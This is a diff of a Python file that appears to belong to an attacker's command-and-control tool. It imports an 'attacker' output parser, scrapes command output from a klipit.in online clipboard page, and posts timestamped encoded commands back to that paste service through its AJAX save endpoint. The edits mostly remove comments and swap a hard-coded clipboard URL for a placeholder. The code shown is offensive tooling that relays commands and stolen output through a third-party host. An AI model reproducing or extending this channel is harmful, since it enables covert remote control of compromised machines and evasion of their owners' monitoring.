@@ -6,19 +6,16 @@ from bs4 import BeautifulSoup
 import attacker.output_parser
 
 
-PRIVATEBIN_URL = "https://klipit.in/ipb83086"
+PRIVATEBIN_URL = "<KLIPIT.IN/CODE>" # eg: klipit.in/ewq81437
 
 def fetch_clipboard_data(url=PRIVATEBIN_URL):
-    # Send GET request to fetch the HTML page
+
     response = requests.get(url)
     
     if response.status_code == 200:
-        # Parse HTML content using BeautifulSoup
+
         soup = BeautifulSoup(response.text, "html.parser")
-        
-        # Find the text inside the <textarea> tag where the clipboard data is stored
         data = soup.find("textarea", {"id": "data"}).text
-        
         filename = "command_outputs.txt"
         with open(filename, "w") as file:
             file.write(data)
@@ -40,27 +37,23 @@ def push_to_klipit(command: str):
     timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     data = f'[{timestamp}]Command:"{encoded_command}"'
     
-    # Step 1: Access the clipboard page to retrieve parameters
+
     response = session.get(url)
     if response.status_code != 200:
-        # print(f"Failed to access clipboard page: {response.status_code}")
         return False
 
-    # Extract 'cid' and 'key' from the page content
+
     cid_match = re.search(r'cid\s*[:=]\s*["\'](\d+)["\']', response.text)
     key_match = re.search(r'key\s*[:=]\s*["\']([a-f0-9]+)["\']', response.text)
 
     if not cid_match or not key_match:
-        # print("Failed to extract 'cid' and 'key' from the page.")
-        # with open("debug_clipboard_page.html", "w", encoding="utf-8") as f:
-        #     f.write(response.text)
         return False
 
 
     cid = cid_match.group(1)
     key = key_match.group(1)
 
-    # Step 2: Send POST request to update clipboard content
+    # POST request to update clipboard content
     post_url = 'https://klipit.in/ajax_save_data.php'
     payload = {
         'i': cid,
